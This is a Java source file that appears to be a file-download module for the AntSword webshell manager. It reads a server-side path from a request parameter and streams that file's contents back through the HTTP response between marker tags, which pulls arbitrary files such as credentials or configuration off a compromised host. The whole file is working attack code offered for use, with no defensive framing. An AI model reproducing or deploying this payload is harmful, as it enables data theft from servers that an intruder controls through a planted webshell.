package filemanager;

import antSword.Template;

import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.lang.reflect.Method;

public class Download_file extends Template {
    @Override
    public String run() throws Exception {

        String z1 = getParam("antswordargpath");
        DownloadFileCode(z1);
        return "";
    }

    void DownloadFileCode(String filePath) throws Exception {
        int n;
        byte[] b = new byte[512];
        response.getClass().getMethod("reset").invoke(response);
        Object os = response.getClass().getMethod("getOutputStream").invoke(response);
        BufferedInputStream is = new BufferedInputStream(new FileInputStream(filePath));
        Method write = os.getClass().getMethod("write", byte[].class);
        Method write2 = os.getClass().getMethod("write", byte[].class, int.class, int.class);
        write.invoke(os, tag_s.getBytes());
        while ((n = is.read(b, 0, 512)) != -1) {
            write2.invoke(os, b, 0, n);
        }
        write.invoke(os, tag_e.getBytes());
        os.getClass().getMethod("close").invoke(response);
        is.close();
    }
}
